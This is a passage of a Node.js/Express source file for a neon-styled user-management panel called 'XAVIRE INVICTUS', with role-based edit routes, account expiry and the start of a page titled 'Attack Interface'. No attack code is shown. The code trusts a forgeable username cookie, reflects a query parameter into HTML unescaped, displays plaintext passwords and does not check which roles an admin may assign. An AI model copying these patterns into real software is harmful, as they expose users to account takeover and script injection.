    .stat-label {
      font-size: 10px;
      color: var(--text-mute);
      text-transform: uppercase;
      font-weight: 600;
      letter-spacing: 1.5px;
      margin-top: 5px;
    }

    /* Table Container */
    .table-container {
      overflow-x: auto;
      border-radius: 25px;
      border: 1px solid var(--glass-border);
      background: rgba(10, 5, 20, 0.4);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 800px;
    }

    th {
      background: rgba(188, 19, 254, 0.05);
      padding: 20px;
      text-align: left;
      color: var(--accent-cyan);
      font-family: 'Orbitron', sans-serif;
      font-size: 10px;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      border-bottom: 1px solid var(--glass-border);
    }

    td {
      padding: 18px 20px;
      color: rgba(255, 255, 255, 0.9);
      font-size: 13px;
      border-bottom: 1px solid rgba(188, 19, 254, 0.05);
      font-family: 'JetBrains Mono', monospace;
    }

    tr:hover td {
      background: rgba(188, 19, 254, 0.03);
    }

    /* Badges */
    .role-badge {
      display: inline-block;
      padding: 5px 12px;
      border-radius: 8px;
      font-size: 9px;
      font-weight: 800;
      text-transform: uppercase;
    }
    .role-owner { background: #FFD700; color: #000; }
    .role-admin { background: #ff0055; color: #fff; }
    .role-reseller { background: var(--accent-cyan); color: #000; }
    .role-user { border: 1px solid var(--accent-purple); color: var(--accent-purple); }

    .btn-edit {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      padding: 7px 14px;
      background: rgba(0, 242, 255, 0.1);
      border: 1px solid var(--accent-cyan);
      border-radius: 10px;
      color: var(--accent-cyan);
      text-decoration: none;
      font-size: 11px;
      font-weight: 600;
      transition: 0.3s;
    }

    .btn-edit:hover {
      background: var(--accent-cyan);
      color: #000;
      box-shadow: 0 0 15px var(--accent-cyan);
    }

    .close-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      width: fit-content;
      padding: 14px 30px;
      margin: 40px auto;
      background: transparent;
      color: var(--text-mute);
      border-radius: 15px;
      text-decoration: none;
      font-family: 'Orbitron', sans-serif;
      font-size: 11px;
      letter-spacing: 2px;
      border: 1px solid var(--glass-border);
      transition: 0.3s;
    }

    .close-btn:hover {
      color: #fff;
      border-color: #fff;
      background: rgba(255,255,255,0.05);
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .stats-bar, .table-container { animation: fadeInUp 0.6s ease-out; }

    @media (max-width: 768px) {
      .stats-bar { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
      .header h2 { font-size: 22px; }
    }

    .table-container::-webkit-scrollbar { height: 5px; }
    .table-container::-webkit-scrollbar-thumb { background: var(--accent-purple); border-radius: 10px; }
  </style>
</head>

<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-layer-group"></i> USER CENTRAL</h2>
      <p>Node Registry & Authorization Console</p>
    </div>

    ${messageHtml}

    <div style="text-align: center;">
      ${addUserButton}
    </div>

    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Nodes</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Identities</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Agents</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Supervisors</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-id-badge"></i> Identity</th>
            <th><i class="fas fa-shield-halved"></i> Security Tier</th>
            <th><i class="fas fa-calendar-xmark"></i> Expired</th>
            <th><i class="fas fa-microchip"></i> Uptime</th>
            <th><i class="fas fa-terminal"></i> Command</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-power-off"></i> EXIT DIRECTORY
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#301050',
        lineColor: '#301050',
        density: 12000,
        particleRadius: 2,
        curvedLines: false,
        proximity: 100
      });
    });
  </script>
</body>

</html>
  `;
  res.send(html);
});

app.get("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const currentUsername = username;
  const targetUsername = req.query.username;

  // Jika tidak ada parameter username, tampilkan form kosong atau redirect
  if (!targetUsername || targetUsername === 'undefined' || targetUsername === 'null') {
    const errorHtml = `
    <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>XAVIRE INVICTUS - System Notification</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Plus+Jakarta+Sans:wght@300;400;600&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
    
    <style>
        :root {
            --bg-black: #05010a;
            --accent-purple: #bc13fe;
            --accent-cyan: #00f2ff;
            --text-main: #ffffff;
            --text-mute: #a193bd;
            --glass: rgba(20, 10, 35, 0.6);
            --border: rgba(188, 19, 254, 0.3);
            --neon-gradient: linear-gradient(135deg, #bc13fe 0%, #00f2ff 100%);
        }

        body { 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            background: var(--bg-black); 
            color: var(--text-main); 
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            background-image: 
                radial-gradient(circle at 50% 50%, rgba(188, 19, 254, 0.1) 0%, transparent 70%);
        }

        /* Scanline Effect */
        body::after {
            content: " ";
            position: absolute;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 2;
            background-size: 100% 2px, 3px 100%;
            pointer-events: none;
        }

        .error-card { 
            position: relative;
            background: var(--glass); 
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            padding: 50px 40px; 
            border-radius: 40px; 
            border: 1px solid var(--border);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8), 
                        inset 0 0 20px rgba(188, 19, 254, 0.1);
            max-width: 420px;
            width: 90%;
            text-align: center;
            z-index: 10;
            animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1);
        }

        /* Neon Glow Top Line */
        .error-card::after {
            content: "";
            position: absolute;
            top: 0; left: 50%;
            transform: translateX(-50%);
            width: 50%;
            height: 3px;
            background: var(--neon-gradient);
            box-shadow: 0 0 15px var(--accent-purple);
            border-radius: 0 0 10px 10px;
        }

        .icon-box {
            font-size: 60px;
            margin-bottom: 25px;
            background: var(--neon-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 10px rgba(188, 19, 254, 0.5));
            animation: pulse 2s infinite;
        }

        h2 {
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 20px;
            margin-bottom: 15px;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: #fff;
        }

        p {
            color: var(--text-mute);
            line-height: 1.6;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .status-tag {
            display: inline-block;
            padding: 6px 16px;
            background: rgba(188, 19, 254, 0.1);
            border-radius: 12px;
            color: var(--accent-cyan);
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            letter-spacing: 1px;
            border: 1px solid rgba(0, 242, 255, 0.2);
            text-transform: uppercase;
        }

        .btn-return {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 16px 32px;
            background: var(--neon-gradient);
            color: #fff;
            text-decoration: none;
            border-radius: 18px;
            margin-top: 35px;
            font-weight: 700;
            font-family: 'Orbitron', sans-serif;
            font-size: 12px;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px rgba(188, 19, 254, 0.3);
            border: none;
            text-transform: uppercase;
            width: 100%;
        }

        .btn-return:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(188, 19, 254, 0.5);
            filter: brightness(1.1);
        }

        .user-link {
            color: var(--accent-cyan);
            text-decoration: none;
            font-weight: 600;
            border-bottom: 1px solid var(--accent-cyan);
            transition: 0.3s;
        }

        .user-link:hover {
            color: #fff;
            border-color: #fff;
            text-shadow: 0 0 8px var(--accent-cyan);
        }

        /* Animations */
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(188, 19, 254, 0.5)); }
            50% { transform: scale(1.05); filter: drop-shadow(0 0 20px rgba(0, 242, 255, 0.8)); }
        }
    </style>
</head>
<body>
    <div class="error-card">
        <div class="icon-box">
            <i class="fas fa-user-shield"></i>
        </div>
        
        <h2>Missing Identity</h2>
        
        <p>Akses ditolak. Silakan pilih target melalui profil resmi di <a href="/userlist" class="user-link">User List Directory</a> untuk melanjutkan modifikasi data.</p>
        
        <div class="status-tag">
            <i class="fas fa-code-branch"></i> Status: ID_PARAM_NULL
        </div>
        
        <a href="/userlist" class="btn-return">
            <i class="fas fa-arrow-left"></i> Return
        </a>
    </div>
</body>
</html>
    `;
    return res.send(errorHtml);
  }

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    const errorHtml = `
    <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XAVIRE INVICTUS - Data Error</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Plus+Jakarta+Sans:wght@300;400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  
  <style>
    :root {
      --bg-black: #05010a;
      --accent-purple: #bc13fe;
      --accent-cyan: #00f2ff;
      --text-main: #ffffff;
      --text-mute: #a193bd;
      --glass: rgba(20, 10, 35, 0.7);
      --glass-border: rgba(188, 19, 254, 0.2);
      --neon-gradient: linear-gradient(135deg, #bc13fe 0%, #00f2ff 100%);
    }

    body { 
      font-family: 'Plus Jakarta Sans', sans-serif; 
      background: var(--bg-black); 
      color: #fff; 
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      background-image: 
          radial-gradient(circle at 50% 50%, rgba(188, 19, 254, 0.1) 0%, transparent 70%),
          radial-gradient(circle at 0% 0%, rgba(0, 242, 255, 0.05) 0%, transparent 50%);
    }

    /* Decorative Rings Neon */
    body::before {
      content: "";
      position: absolute;
      width: 550px;
      height: 550px;
      border: 1px solid rgba(188, 19, 254, 0.15);
      border-radius: 50%;
      z-index: 0;
      animation: pulseRing 5s infinite ease-in-out;
    }

    .error { 
      position: relative;
      z-index: 1;
      background: var(--glass); 
      backdrop-filter: blur(40px);
      -webkit-backdrop-filter: blur(40px);
      padding: 60px 40px; 
      border-radius: 40px; 
      border: 1px solid var(--glass-border);
      box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6), 
                  inset 0 0 40px rgba(188, 19, 254, 0.05);
      max-width: 450px;
      width: 90%;
      text-align: center;
      animation: scaleIn 0.6s cubic-bezier(0.23, 1, 0.32, 1);
    }

    /* Glow Indicator top */
    .error-header-line {
      position: absolute;
      top: 0; left: 50%;
      transform: translateX(-50%);
      width: 120px;
      height: 4px;
      background: var(--neon-gradient);
      box-shadow: 0 0 25px var(--accent-purple);
      border-radius: 0 0 10px 10px;
    }

    .icon-error {
      font-size: 70px;
      background: var(--neon-gradient);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 25px;
      filter: drop-shadow(0 0 15px rgba(188, 19, 254, 0.4));
      animation: floatEffect 3s infinite ease-in-out;
    }

    h2 {
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 22px;
      margin-bottom: 20px;
      letter-spacing: 3px;
      text-transform: uppercase;
      color: var(--text-main);
    }

    p {
      color: var(--text-mute);
      line-height: 1.8;
      font-size: 15px;
      margin-bottom: 15px;
    }

    strong {
      color: var(--accent-cyan);
      background: rgba(0, 242, 255, 0.1);
      padding: 4px 12px;
      border-radius: 8px;
      font-family: 'Orbitron', sans-serif;
      font-size: 12px;
      border: 1px solid rgba(0, 242, 255, 0.2);
    }

    /* Luxury Button */
    .btn-back {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin-top: 35px;
      padding: 18px 35px;
      background: var(--neon-gradient);
      color: #fff;
      text-decoration: none;
      border-radius: 20px;
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 12px;
      letter-spacing: 2px;
      transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      box-shadow: 0 10px 20px rgba(188, 19, 254, 0.3);
      border: none;
    }

    .btn-back:hover {
      transform: translateY(-5px) scale(1.05);
      box-shadow: 0 15px 30px rgba(188, 19, 254, 0.5);
      filter: brightness(1.2);
    }

    .btn-back:active {
      transform: scale(0.95);
    }

    .link-list {
      color: var(--accent-cyan);
      text-decoration: none;
      font-weight: 600;
      border-bottom: 1px solid transparent;
      transition: 0.3s;
    }

    .link-list:hover {
      color: #fff;
      border-bottom-color: var(--accent-cyan);
      text-shadow: 0 0 10px var(--accent-cyan);
    }

    /* Animations */
    @keyframes scaleIn {
      from { opacity: 0; transform: scale(0.9) translateY(20px); }
      to { opacity: 1; transform: scale(1) translateY(0); }
    }

    @keyframes pulseRing {
      0% { transform: scale(0.8); opacity: 0.3; }
      50% { transform: scale(1.1); opacity: 0.1; }
      100% { transform: scale(0.8); opacity: 0.3; }
    }

    @keyframes floatEffect {
      0%, 100% { transform: translateY(0) rotate(0); }
      50% { transform: translateY(-15px) rotate(5deg); }
    }
  </style>
</head>
<body>

  <div class="error">
    <div class="error-header-line"></div>
    <div class="icon-error">
      <i class="fas fa-satellite-dish"></i>
    </div>
    <h2>Data Not Found</h2>
    <p>Identity <strong>"${targetUsername}"</strong> tidak terdeteksi dalam node database XAVIRE INVICTUS.</p>
    <p>Silakan kembali ke <a href="/userlist" class="link-list">Main Terminal</a></p>
    
    <a href="/userlist" class="btn-back">
      <i class="fas fa-sync-alt"></i> RE-SYNC SYSTEM
    </a>
  </div>

</body>
</html>
    `;
    return res.send(errorHtml);
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒
  
  // 1. Tidak bisa edit akun sendiri
  if (targetUsername === currentUsername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (role === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (role === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // 🔒 Tentukan opsi role yang boleh diedit
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${targetUser.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${targetUser.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
    `;
  } else {
    // Reseller tidak bisa edit role
    roleOptions = `<option value="${targetUser.role}" selected>${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((targetUser.expired - now) / 86400000));
  const expiredText = new Date(targetUser.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  // HTML form edit user dengan tombol yang sudah dirapihin untuk mobile
  const html = `
  <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XAVIRE INVICTUS - Edit Module</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Plus+Jakarta+Sans:wght@300;400;600&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    
    <style>
        :root {
            --bg-black: #05010a;
            --accent-purple: #bc13fe;
            --accent-cyan: #00f2ff;
            --text-main: #ffffff;
            --text-mute: #a193bd;
            --danger: #ff2d55;
            --glass: rgba(20, 10, 35, 0.7);
            --glass-border: rgba(188, 19, 254, 0.2);
            --neon-gradient: linear-gradient(135deg, #bc13fe 0%, #00f2ff 100%);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: var(--bg-black);
            color: var(--text-main);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 50% -20%, rgba(188, 19, 254, 0.15) 0%, transparent 50%);
        }

        #particles {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 0;
            opacity: 0.3;
        }

        .content {
            position: relative;
            z-index: 2;
            width: 100%;
            max-width: 480px;
            animation: fadeInUp 0.8s cubic-bezier(0.23, 1, 0.32, 1);
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 28px;
            letter-spacing: 4px;
            background: var(--neon-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
            filter: drop-shadow(0 0 10px rgba(188, 19, 254, 0.3));
        }

        .header p {
            color: var(--text-mute);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        /* FORM CONTAINER */
        .form-container {
            background: var(--glass);
            backdrop-filter: blur(30px) saturate(150%);
            -webkit-backdrop-filter: blur(30px) saturate(150%);
            border: 1px solid var(--glass-border);
            padding: 30px;
            border-radius: 30px;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
            position: relative;
            overflow: hidden;
        }

        .form-container::before {
            content: "";
            position: absolute;
            top: 0; left: 50%;
            transform: translateX(-50%);
            width: 50%; height: 2px;
            background: var(--neon-gradient);
        }

        /* USER INFO DECK */
        .user-info {
            background: rgba(188, 19, 254, 0.05);
            padding: 20px;
            border-radius: 20px;
            margin-bottom: 25px;
            border: 1px solid rgba(188, 19, 254, 0.1);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 12px;
            font-family: 'JetBrains Mono', monospace;
        }

        .info-label { color: var(--text-mute); text-transform: uppercase; }
        .info-value { color: var(--text-main); font-weight: 600; }

        /* BADGES */
        .role-badge {
            padding: 3px 10px;
            border-radius: 6px;
            font-size: 9px;
            font-weight: 800;
            text-transform: uppercase;
        }
        .role-owner { background: #FFD700; color: #000; }
        .role-admin { background: #ff0055; color: #fff; }
        .role-reseller { background: var(--accent-cyan); color: #000; }
        .role-user { border: 1px solid var(--accent-purple); color: var(--accent-purple); }

        .form-group { margin-bottom: 20px; }

        label {
            display: block;
            margin-left: 5px;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--accent-cyan);
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-family: 'Orbitron', sans-serif;
        }

        /* INPUTS */
        input, select {
            width: 100%;
            padding: 14px 18px;
            border-radius: 15px;
            border: 1px solid rgba(188, 19, 254, 0.1);
            background: rgba(10, 5, 20, 0.5);
            color: #FFFFFF;
            font-size: 14px;
            transition: all 0.3s ease;
            font-family: 'Plus Jakarta Sans', sans-serif;
        }

        input:focus, select:focus {
            outline: none;
            border-color: var(--accent-purple);
            box-shadow: 0 0 15px rgba(188, 19, 254, 0.2);
            background: rgba(188, 19, 254, 0.05);
        }

        /* BUTTONS */
        .button-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 25px;
        }

        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 15px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 11px;
            letter-spacing: 2px;
            cursor: pointer;
            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            text-transform: uppercase;
        }

        .btn:active { transform: scale(0.97); }

        .btn-save {
            background: var(--neon-gradient);
            color: #fff;
            box-shadow: 0 10px 20px rgba(188, 19, 254, 0.2);
        }

        .btn-save:hover {
            filter: brightness(1.2);
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(188, 19, 254, 0.4);
        }

        .btn-delete {
            background: rgba(255, 45, 85, 0.1);
            color: var(--danger);
            border: 1px solid rgba(255, 45, 85, 0.2);
        }

        .btn-delete:hover {
            background: var(--danger);
            color: #fff;
            box-shadow: 0 10px 20px rgba(255, 45, 85, 0.3);
        }

        .btn-back {
            background: transparent;
            color: var(--text-mute);
            font-size: 10px;
            border: 1px solid var(--glass-border);
            text-decoration: none;
        }

        .btn-back:hover {
            color: #fff;
            border-color: #fff;
            background: rgba(255,255,255,0.05);
        }

        .warning-text { color: var(--danger) !important; text-shadow: 0 0 10px rgba(255, 45, 85, 0.3); }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: var(--accent-purple); border-radius: 10px; }
    </style>
</head>
<body>
    <div id="particles"></div>

    <div class="content">
        <div class="header">
            <h2>EDIT MODULE</h2>
            <p>Authorization Level: System Administrator</p>
        </div>

        <div class="form-container">
            <div class="user-info">
                <div class="info-row">
                    <span class="info-label">Node Identity:</span>
                    <span class="info-value">${targetUser.username}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Security Tier:</span>
                    <span class="info-value">
                        <span class="role-badge role-${targetUser.role}">
                            ${targetUser.role}
                        </span>
                    </span>
                </div>
                <div class="info-row">
                    <span class="info-label">Termination:</span>
                    <span class="info-value">${expiredText}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Remaining:</span>
                    <span class="info-value ${sisaHari <= 7 ? 'warning-text' : ''}">${sisaHari} Cycles</span>
                </div>
            </div>

            <form method="POST" action="/edituser">
                <input type="hidden" name="oldusername" value="${targetUser.username}">
                
                <div class="form-group">
                    <label><i class="fas fa-id-card-alt"></i> New Identity</label>
                    <input type="text" name="username" value="${targetUser.username}" required>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-key"></i> Access Code</label>
                    <input type="text" name="password" value="${targetUser.key}" required>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-clock"></i> Extend Lifespan (Days)</label>
                    <input type="number" name="extend" min="0" max="365" placeholder="0" value="0">
                </div>

                <div class="form-group">
                    <label><i class="fas fa-user-shield"></i> Security Protocol</label>
                    <select name="role" ${role === 'reseller' ? 'disabled' : ''}>
                        ${roleOptions}
                    </select>
                    ${role === 'reseller' ? '<input type="hidden" name="role" value="' + targetUser.role + '">' : ''}
                </div>

                <div class="button-group">
                    <button type="submit" class="btn btn-save">
                        <i class="fas fa-check-circle"></i> Commit Changes
                    </button>

                    <button type="button" class="btn btn-delete" onclick="handleDelete()">
                        <i class="fas fa-radiation"></i> Purge Node
                    </button>

                    <a href="/userlist" class="btn btn-back">
                        <i class="fas fa-chevron-left"></i> Abort Mission
                    </a>
                </div>
            </form>
        </div>
    </div>

    <form id="deleteForm" method="POST" action="/hapususer" style="display: none;">
        <input type="hidden" name="username" value="${targetUser.username}">
    </form>

    <script>
        $(document).ready(function() {
            $('#particles').particleground({
                dotColor: '#301050',
                lineColor: '#301050',
                density: 12000,
                proximity: 100
            });
        });

        function handleDelete() {
            if (confirm('CRITICAL WARNING: Purge data for ${targetUser.username}? This process is irreversible.')) {
                document.getElementById('deleteForm').submit();
            }
        }
    </script>
</body>
</html>
  `;
  res.send(html);
});

// user profile new


// Tambahkan ini setelah route GET /edituser
app.post("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { oldusername, username: newUsername, password, role, extend } = req.body;

  // Validasi input
  if (!oldusername || !newUsername || !password || !role) {
    return res.send("❌ Semua field harus diisi.");
  }

  // Cari user yang akan diedit
  const targetUserIndex = users.findIndex(u => u.username === oldusername);
  if (targetUserIndex === -1) {
    return res.send("❌ User tidak ditemukan.");
  }

  const targetUser = users[targetUserIndex];

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒
  
  // 1. Tidak bisa edit akun sendiri
  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // Update data user
  users[targetUserIndex] = {
    ...users[targetUserIndex],
    username: newUsername,
    key: password,
    role: role
  };

  // Tambah masa aktif jika ada
  if (extend && parseInt(extend) > 0) {
    users[targetUserIndex].expired += parseInt(extend) * 86400000;
  }

  saveUsers(users);
  
  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + newUsername + " berhasil diupdate");
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};


// ==================== HTML EXECUTION ==================== //
const executionPage = (status, data, showInput, userInfo = {}) => {
    // 1. Ambil data mentah dari object userInfo yang dikirim dari route
    const username = userInfo.username || "Unknown";
    const role = userInfo.role || "VIP MEMBER";
    const expired = userInfo.expired;
    
    // Format tanggal expired agar terbaca manusia (Asia/Jakarta)
    const formattedTime = expired
        ? new Date(expired).toLocaleString("id-ID", {
            timeZone: "Asia/Jakarta",
            year: "2-digit",
            month: "2-digit",
            day: "2-digit",
            hour: "2-digit",
            minute: "2-digit",
          })
        : "-";

    return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>XAVIRE INVICTUS - Attack Interface</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Plus+Jakarta+Sans:wght@500;600;700&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        :root {
            --bg-black: #05010a;
            --surface-card: rgba(20, 10, 35, 0.6);
            --accent-purple: #bc13fe;
            --accent-cyan: #00f2ff;
            --accent-glow: rgba(188, 19, 254, 0.3);
            --text-main: #ffffff;
            --text-mute: #a193bd;
            --border-neon: rgba(188, 19, 254, 0.2);
            --btn-purple: #2a0a4d;
            --danger: #ff2d55;
            --neon-gradient: linear-gradient(135deg, #bc13fe 0%, #00f2ff 100%);
        }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background-color: var(--bg-black);
            color: var(--text-main);
            padding: 20px;
            padding-bottom: 120px;
            display: flex;
            justify-content: center;
            overflow-x: hidden;
            background-image: radial-gradient(circle at 50% -20%, rgba(188, 19, 254, 0.15) 0%, transparent 50%);
        }

        .container {
            width: 100%;
            max-width: 450px;
            display: flex;
            flex-direction: column;
            gap: 20px;
